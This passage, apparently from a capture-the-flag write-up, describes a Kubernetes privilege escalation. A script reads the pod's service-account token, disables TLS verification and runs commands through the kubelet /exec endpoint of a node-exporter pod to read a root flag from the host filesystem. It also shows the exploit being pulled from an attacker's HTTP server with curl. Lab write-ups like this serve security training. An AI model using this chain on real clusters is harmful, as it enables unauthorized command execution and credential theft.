How the script works

The script reads the Kubernetes service-account token from:

/var/run/secrets/kubernetes.io/serviceaccount/token

It then creates a WebSocket connection to:

wss://10.129.244.214:10250

The endpoint being targeted is the Kubernetes kubelet /exec interface:

/exec/{namespace}/{pod}/{container}

The target pod is:

namespace: monitoring
pod: prometheus-prometheus-node-exporter-nmntq
container: node-exporter

The script disables TLS certificate verification:

ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

and authenticates using the service-account token:

additional_headers={"Authorization": f"Bearer {TOKEN}"}

The Kubernetes WebSocket subprotocol:

v4.channel.k8s.io

is required for the kubelet exec protocol.
23. Transfer the Exploit to the MCP Container

Host the Python script from the attacking machine using a simple HTTP server.

From the MCP container, download it:

mcp@mcp-server-54464cb475-29ztf:/tmp$ curl http://10.10.15.161:8080/kuby.py -o kuby.py

The script is now available locally:

/tmp/kuby.py

24. Accessing the Host Filesystem

The node-exporter pod has access to the host filesystem mounted under:

/host/root

Therefore, instead of reading:

/root/root.txt

inside the current container, we can target:

/host/root/root/root.txt

Run:

mcp@mcp-server-54464cb475-29ztf:/tmp$ python3 kuby.py "cat /host/root/root/root.txt"

The command is executed through the Kubernetes kubelet and reads the root flag from the host filesystem.

This completes the privilege-escalation chain.
